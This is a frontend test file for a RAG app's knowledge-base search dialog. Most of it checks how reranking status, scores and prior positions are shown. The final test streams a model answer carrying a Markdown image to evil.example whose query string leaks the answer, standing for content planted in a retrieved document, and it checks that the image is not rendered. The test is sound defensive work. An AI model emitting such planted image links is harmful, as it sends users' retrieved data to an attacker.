// The "Test knowledge base" dialog shows whether reranking took effect:
// the status of the search (reranked, or fusion order kept and why), and
// for reranked results the rerank score and the position before reranking.

import { act, cleanup, render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const invoke = vi.hoisted(() => vi.fn());
// The dialog's stream listeners, by event name, so a test can stream an answer.
const listeners = vi.hoisted(() => new Map<string, (e: { payload: unknown }) => void>());
vi.mock("@tauri-apps/api/core", () => ({ invoke: (cmd: string, args?: unknown) => invoke(cmd, args) }));
vi.mock("@tauri-apps/api/event", () => ({
  listen: async (event: string, handler: (e: { payload: unknown }) => void) => {
    listeners.set(event, handler);
    return () => listeners.delete(event);
  },
}));
vi.mock("@tauri-apps/plugin-store", () => ({
  load: async () => ({
    get: async () => undefined,
    set: async () => {},
    save: async () => {},
    onKeyChange: async () => () => {},
  }),
}));

import type { RagRerankReport, RagSearchOutcome, RagSearchResult } from "../lib/types";
import type { RagSettingsView } from "../lib/rag/types";
import { useRagStore } from "../stores/ragStore";
import { TestSearchDialog } from "./TestSearchDialog";

function chunk(id: string, file: string, score: number, fused?: [number, number]): RagSearchResult {
  return {
    chunk_id: id,
    text: `text of ${file}`,
    score,
    normalized_score: 1,
    source_file: file,
    chunk_index: 0,
    source_type: "file",
    fused_rank: fused?.[0] ?? null,
    fused_score: fused?.[1] ?? null,
  };
}

function settings(rerank: { enabled: boolean; model: string }): RagSettingsView {
  return {
    config: { enabled: false, top_k: 3, search_mode: "hybrid", embedding_model: "bge-m3", rerank } as unknown as RagSettingsView["config"],
    effective: { query_prefix: "", document_prefix: "", max_input_tokens: 2048, concurrency: 4 },
    connections: [],
  };
}

let outcome: RagSearchOutcome;

async function handle(cmd: string): Promise<unknown> {
  switch (cmd) {
    case "test_rag_search":
      return JSON.stringify(outcome);
    case "test_rag_answer":
      return undefined;
    case "rag_get_settings":
      return settings({ enabled: true, model: "loaded-reranker" });
    case "rag_get_index_info":
      return { job: null, needs_rebuild: false };
    default:
      throw new Error(`unexpected command ${cmd}`);
  }
}

const fused = [chunk("2", "b.txt", 0.0164), chunk("3", "c.txt", 0.016), chunk("1", "a.txt", 0.0151)];

async function ask(query = "预算会议") {
  const user = userEvent.setup();
  await user.type(screen.getByPlaceholderText("Ask a question about your documents..."), `${query}{Enter}`);
  await screen.findByText("b.txt");
}

beforeEach(() => {
  invoke.mockReset();
  invoke.mockImplementation(handle);
  useRagStore.setState({ settings: settings({ enabled: true, model: "BAAI/bge-reranker-v2-m3" }) });
});

afterEach(cleanup);

describe("test search dialog: reranking", () => {
  it("marks reranked results with the rerank score and the position before reranking", async () => {
    outcome = {
      chunks: [chunk("1", "a.txt", 0.912, [3, 0.0151]), chunk("2", "b.txt", 0.554, [1, 0.0164]), chunk("3", "c.txt", 0.031, [2, 0.016])],
      vector_used: true,
      degraded: null,
      rerank: { status: "applied", candidates: 12, latency_ms: 85, error: null, error_kind: null },
    };
    render(<TestSearchDialog isOpen onClose={() => {}} />);
    expect(screen.getByText("rerank: BAAI/bge-reranker-v2-m3")).toBeInTheDocument();
    await ask();

    expect(screen.getByText("Reranked · 12 candidates · 85 ms")).toBeInTheDocument();
    expect(screen.getByText("was #3")).toHaveAttribute(
      "title",
      "Position after fusion, before reranking (fusion score 0.0151)",
    );
    expect(screen.getByText("was #1")).toBeInTheDocument();
    expect(screen.getByText("was #2")).toBeInTheDocument();
    const scores = screen.getAllByTitle("Rerank score");
    expect(scores.map((s) => s.textContent)).toEqual(["0.912", "0.554", "0.031"]);
    expect(invoke).toHaveBeenCalledWith("test_rag_search", { query: "预算会议" });
  });

  it.each<[RagRerankReport, string]>([
    [
      { status: "failed", candidates: 12, latency_ms: 2501, error: "http://127.0.0.1:8080/rerank: timed out (operation timed out)", error_kind: "transient" },
      "Rerank failed: fusion order kept",
    ],
    [
      { status: "unconfigured", candidates: 0, latency_ms: 0, error: "No rerank model is set", error_kind: "config" },
      "Rerank is on but can't be used: fusion order kept",
    ],
    [
      { status: "paused", candidates: 0, latency_ms: 0, error: null, error_kind: null },
      "Rerank paused after repeated failures: fusion order kept",
    ],
  ])("shows that the fusion order was kept (%#)", async (report, label) => {
    outcome = { chunks: fused, vector_used: true, degraded: null, rerank: report };
    render(<TestSearchDialog isOpen onClose={() => {}} />);
    await ask();
    expect(screen.getByText(label)).toBeInTheDocument();
    if (report.error) expect(screen.getByText(report.error)).toBeInTheDocument();
    expect(screen.queryByText(/^Reranked/)).not.toBeInTheDocument();
    expect(screen.queryByText(/^was #/)).not.toBeInTheDocument();
    expect(screen.queryAllByTitle("Rerank score")).toHaveLength(0);
  });

  it("shows nothing about reranking when it is off", async () => {
    useRagStore.setState({ settings: settings({ enabled: false, model: "BAAI/bge-reranker-v2-m3" }) });
    outcome = { chunks: fused, vector_used: true, degraded: null, rerank: null };
    render(<TestSearchDialog isOpen onClose={() => {}} />);
    expect(screen.queryByText(/^rerank/)).not.toBeInTheDocument();
    await ask();
    expect(screen.queryByText(/Rerank|Reranked|was #/)).not.toBeInTheDocument();
    // The plain search scores, as before.
    expect(screen.getAllByText(/^0\.01[56]$/)).toHaveLength(3);
  });

  it("loads the settings when opened without them (from the launcher)", async () => {
    useRagStore.setState({ settings: null });
    outcome = { chunks: fused, vector_used: true, degraded: null, rerank: null };
    render(<TestSearchDialog isOpen onClose={() => {}} />);
    await waitFor(() => expect(invoke).toHaveBeenCalledWith("rag_get_settings", undefined));
    expect(await screen.findByText("rerank: loaded-reranker")).toBeInTheDocument();
  });
});

describe("test search dialog: answer", () => {
  it("renders the streamed answer as Markdown", async () => {
    outcome = { chunks: fused, vector_used: true, degraded: null, rerank: null };
    const { container } = render(<TestSearchDialog isOpen onClose={() => {}} />);
    await ask();
    await waitFor(() => expect(listeners.has("llm_stream_end")).toBe(true));
    const call = invoke.mock.calls.find(([cmd]) => cmd === "test_rag_answer");
    const request_id = (call?.[1] as { requestId: string }).requestId;

    // The image is planted in a document: its URL would carry the answer out.
    const answer = "根据论文，**精确档误差为 28.8%**。\n\n1. 第一点\n2. 第二点\n\n![图](https://evil.example/x.png?q=28.8)\n";
    act(() => {
      for (const token of answer.match(/.{1,5}/gs) ?? []) {
        listeners.get("llm_stream_token")?.({ payload: { token, request_id } });
      }
      listeners.get("llm_stream_end")?.({ payload: { total_tokens: 42, latency_ms: 900, request_id, cancelled: false } });
    });

    expect(screen.getByText("精确档误差为 28.8%").tagName).toBe("STRONG");
    expect(container.querySelectorAll("ol > li")).toHaveLength(2);
    expect(container.textContent).not.toContain("**");
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("[图]")).toBeInTheDocument();
  });
});
